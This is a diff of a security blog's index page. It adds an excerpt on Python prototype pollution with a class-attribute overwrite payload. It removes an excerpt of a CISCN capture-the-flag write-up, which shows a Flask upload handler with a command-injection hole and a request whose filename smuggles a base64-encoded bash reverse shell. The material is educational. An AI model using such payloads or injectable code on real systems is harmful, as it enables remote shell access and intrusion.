@@ -137,6 +137,41 @@
 <div class="row">
 	<div class="col-md-8">
 		<h3 class="title">
+			<a href="/2024/02/20/python/Python Prototype Pollution/" >Python Prototype Pollution</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2024-02-20  </div>
+		</div>
+	</div>
+	
+
+
+			<div class="entry">
+  <div class="row">
+	
+	
+		<h2 id="Python-Prototype-Pollution"><a href="#Python-Prototype-Pollution" class="headerlink" title="Python Prototype Pollution"></a>Python Prototype Pollution</h2><p>Python原型链污染通常是指通过某种方式非法地修改了对象的原型链，导致对象访问到了不应该访问到的属性或方法，或者对象的属性被非法地修改</p>
+<p>Python中，这通常意味着通过修改类的<code>__dict__</code>或对象的<code>__class__</code>属性，来实现对类或对象属性的非法修改</p>
+<h3 id="基类"><a href="#基类" class="headerlink" title="基类"></a>基类</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">string = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(string.__class__) <span class="comment"># &lt;class &#x27;str&#x27;&gt;</span></span><br><span class="line"><span class="built_in">print</span>(string.__class__.__base__) <span class="comment"># &lt;class &#x27;object&#x27;&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">function</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="built_in">print</span>(function.__class__) <span class="comment"># &lt;class &#x27;function&#x27;&gt;</span></span><br><span class="line"><span class="built_in">print</span>(function.__class__.__base__) <span class="comment"># &lt;class &#x27;object&#x27;&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="原型链污染"><a href="#原型链污染" class="headerlink" title="原型链污染"></a>原型链污染</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">father</span>:</span><br><span class="line">    secret = <span class="string">&quot;xxxx&quot;</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">son_a</span>(<span class="title class_ inherited__">father</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">son_b</span>(<span class="title class_ inherited__">father</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将源字典 src 中的键值对合并到目标对象 dst 中</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line">instance = son_b()</span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__class__&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;__base__&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;secret&quot;</span>: <span class="string">&quot;no&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(son_a.secret) <span class="comment"># xxxx</span></span><br><span class="line"><span class="built_in">print</span>(instance.secret) <span class="comment"># xxxx</span></span><br><span class="line"></span><br><span class="line">merge(payload, instance)</span><br><span class="line"><span class="built_in">print</span>(son_a.secret) <span class="comment"># no</span></span><br><span class="line"><span class="built_in">print</span>(instance.secret) <span class="comment"># no</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 污染内置属性</span></span><br><span class="line"><span class="comment"># payload = &#123;</span></span><br><span class="line"><span class="comment">#     &quot;__class__&quot; : &#123;</span></span><br><span class="line"><span class="comment">#         &quot;__base__&quot; : &#123;</span></span><br><span class="line"><span class="comment">#             &quot;__str__&quot; : &quot;Polluted&quot;</span></span><br><span class="line"><span class="comment">#         &#125;</span></span><br><span class="line"><span class="comment">#     &#125;</span></span><br><span class="line"><span class="comment"># &#125;</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># print(father.__str__) #&lt;slot wrapper &#x27;__str__&#x27; of &#x27;object&#x27; objects&gt;</span></span><br><span class="line"><span class="comment"># merge(payload, instance)</span></span><br><span class="line"><span class="comment"># print(father.__str__) #Polluted</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="无法污染的Object"><a href="#无法污染的Object" class="headerlink" title="无法污染的Object"></a>无法污染的Object</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">merge(payload, <span class="built_in">object</span>)</span><br><span class="line"><span class="comment"># 报错：TypeError: can&#x27;t set attributes of built-in/extension type &#x27;object&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="全局变量获取"><a href="#全局变量获取" class="headerlink" title="全局变量获取"></a>全局变量获取</h3>
+	
+	</div>
+  <a type="button" href="/2024/02/20/python/Python Prototype Pollution/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
 			<a href="/2024/02/02/javascript/Javascript Prototype Pollution/" >JavaScript Prototype Pollution</a>
 		</h3>
 		</div>
@@ -162,46 +197,6 @@
 	
 	</div>
   <a type="button" href="/2024/02/02/javascript/Javascript Prototype Pollution/#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2024/01/30/writeup/ciscn/2023CISCN华北分区/" >2023CISCN华北分区</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2024-01-30  </div>
-		</div>
-	</div>
-	
-
-
-			<div class="entry">
-  <div class="row">
-	
-	
-		<h1 id="2023CISCN华北分区"><a href="#2023CISCN华北分区" class="headerlink" title="2023CISCN华北分区"></a>2023CISCN华北分区</h1><h2 id="pysym"><a href="#pysym" class="headerlink" title="pysym"></a>pysym</h2><blockquote>
-<p>命令注入</p>
-</blockquote>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, send_from_directory</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>]=<span class="string">&#x27;uploads&#x27;</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">POST</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;No file uploaded.&#x27;</span></span><br><span class="line">    file = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> file.content_length &gt; <span class="number">10240</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;file too lager&#x27;</span></span><br><span class="line">    path = <span class="string">&#x27;&#x27;</span>.join(random.choices(string.hexdigits, k=<span class="number">16</span>))</span><br><span class="line">    directory = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], path)</span><br><span class="line">    os.makedirs(directory, mode=<span class="number">0o755</span>, exist_ok=<span class="literal">True</span>)</span><br><span class="line">    savepath=os.path.join(directory, file.filename)</span><br><span class="line">    file.save(savepath)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">     os.system(<span class="string">&#x27;tar --absolute-names  -xvf &#123;&#125; -C &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(savepath,directory))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;something wrong in extracting&#x27;</span></span><br><span class="line"></span><br><span class="line">    links = []</span><br><span class="line">    <span class="keyword">for</span> root, dirs, files <span class="keyword">in</span> os.walk(directory):</span><br><span class="line">        <span class="keyword">for</span> name <span class="keyword">in</span> files:</span><br><span class="line">            extractedfile =os.path.join(root, name)</span><br><span class="line">            <span class="keyword">if</span> os.path.islink(extractedfile):</span><br><span class="line">                os.remove(extractedfile)</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;no symlink&#x27;</span></span><br><span class="line">            <span class="keyword">if</span>  os.path.isdir(path) :</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;no directory&#x27;</span></span><br><span class="line">            links.append(extractedfile)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>,links=links)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/uploads/&lt;path:path&gt;&quot;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download</span>(<span class="params">path</span>):</span><br><span class="line">    filepath = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], path)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.isfile(filepath):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;404&#x27;</span>, <span class="number">404</span></span><br><span class="line">    <span class="keyword">return</span> send_from_directory(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], path)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">1337</span>)</span><br></pre></td></tr></table></figure>
-
-<p>这里会将文件解压到随机路径，可以对文件名进行命令注入，由于文件名不能包含<code>/</code>等特殊字符，所以需要把反弹shell的命令base64编码一下：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">os.system(&#x27;tar --absolute-names  -xvf &#123;&#125; -C &#123;&#125;&#x27;.format(savepath,directory))</span><br></pre></td></tr></table></figure>
-
-<p>请求包</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: localhost:12345</span><br><span class="line">Content-Length: 277</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryLtw6UwBXBsZ5zrtu</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryLtw6UwBXBsZ5zrtu</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;a||echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEyNy4wLjAuMS80NDQ0IDA+JjE=|base64 -d|bash||&quot;</span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line"></span><br><span class="line">123</span><br><span class="line">------WebKitFormBoundaryLtw6UwBXBsZ5zrtu--</span><br></pre></td></tr></table></figure>
-
-<h2 id="filechecker"><a href="#filechecker" class="headerlink" title="filechecker"></a>filechecker</h2><blockquote>
-<p>phar反序列化</p>
-</blockquote>
-	
-	</div>
-  <a type="button" href="/2024/01/30/writeup/ciscn/2023CISCN华北分区/#more" class="btn btn-default more">Read More</a>
 </div>
 
 		
@@ -279,45 +274,45 @@
 		<h4>Tag Cloud</h4>
 		<ul class="tag_box inline list-unstyled">		
 		
-			<li><a href="/tags/Lateral-Movement/">Lateral-Movement<span>3</span></a></li>
-		
-			<li><a href="/tags/Base/">Base<span>5</span></a></li>
-		
-			<li><a href="/tags/Fastjson/">Fastjson<span>1</span></a></li>
-		
-			<li><a href="/tags/General/">General<span>1</span></a></li>
-		
-			<li><a href="/tags/Web-Pentest/">Web-Pentest<span>8</span></a></li>
-		
-			<li><a href="/tags/Hash/">Hash<span>1</span></a></li>
-		
-			<li><a href="/tags/Service-Test/">Service-Test<span>1</span></a></li>
-		
-			<li><a href="/tags/HTB/">HTB<span>10</span></a></li>
-		
-			<li><a href="/tags/CommonsCollections/">CommonsCollections<span>5</span></a></li>
-		
-			<li><a href="/tags/CISCN/">CISCN<span>3</span></a></li>
-		
-			<li><a href="/tags/Pollution/">Pollution<span>2</span></a></li>
-		
 			<li><a href="/tags/Enumeration/">Enumeration<span>4</span></a></li>
 		
-			<li><a href="/tags/Log4j2/">Log4j2<span>1</span></a></li>
-		
-			<li><a href="/tags/JNDI/">JNDI<span>1</span></a></li>
-		
-			<li><a href="/tags/RMI/">RMI<span>1</span></a></li>
-		
-			<li><a href="/tags/Privesc/">Privesc<span>3</span></a></li>
+			<li><a href="/tags/Deserialize/">Deserialize<span>7</span></a></li>
 		
 			<li><a href="/tags/Http/">Http<span>1</span></a></li>
 		
+			<li><a href="/tags/CommonsCollections/">CommonsCollections<span>5</span></a></li>
+		
+			<li><a href="/tags/General/">General<span>1</span></a></li>
+		
+			<li><a href="/tags/CISCN/">CISCN<span>3</span></a></li>
+		
+			<li><a href="/tags/HTB/">HTB<span>10</span></a></li>
+		
+			<li><a href="/tags/Hash/">Hash<span>1</span></a></li>
+		
+			<li><a href="/tags/Shiro/">Shiro<span>1</span></a></li>
+		
 			<li><a href="/tags/Tunnel/">Tunnel<span>1</span></a></li>
+		
+			<li><a href="/tags/RMI/">RMI<span>1</span></a></li>
 		
 			<li><a href="/tags/Crack/">Crack<span>2</span></a></li>
 		
-			<li><a href="/tags/Deserialize/">Deserialize<span>7</span></a></li>
+			<li><a href="/tags/Lateral-Movement/">Lateral-Movement<span>3</span></a></li>
+		
+			<li><a href="/tags/Fastjson/">Fastjson<span>1</span></a></li>
+		
+			<li><a href="/tags/Privesc/">Privesc<span>3</span></a></li>
+		
+			<li><a href="/tags/Pollution/">Pollution<span>2</span></a></li>
+		
+			<li><a href="/tags/Base/">Base<span>5</span></a></li>
+		
+			<li><a href="/tags/Service-Test/">Service-Test<span>1</span></a></li>
+		
+			<li><a href="/tags/Log4j2/">Log4j2<span>1</span></a></li>
+		
+			<li><a href="/tags/Web-Pentest/">Web-Pentest<span>8</span></a></li>
 		
 		
 		   <li><a href="/tags">...<span>21</span></a></li>
@@ -333,6 +328,10 @@
   <ul class="entry list-unstyled">
     
       <li>
+        <a href="/2025/03/08/HTB CPTS/" ><i class="fa fa-file-o"></i>HTB CPTS</a>
+      </li>
+    
+      <li>
         <a href="/2024/10/30/pentest/privesc/Windows Privilege Escalation/" ><i class="fa fa-file-o"></i>Windows Privilege Escalation</a>
       </li>
     
@@ -346,10 +345,6 @@
     
       <li>
         <a href="/2024/10/16/pentest/web-pentest/Command Injections/" ><i class="fa fa-file-o"></i>Command Injections</a>
-      </li>
-    
-      <li>
-        <a href="/2024/10/14/pentest/web-pentest/File Upload/" ><i class="fa fa-file-o"></i>File Upload</a>
       </li>
     
   </ul>
@@ -379,7 +374,7 @@
   <div class="container-narrow">
   <footer> <p>
   
-  &copy; 2024 n2ryx's Blog
+  &copy; 2025 n2ryx's Blog
   
       powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
 </p>
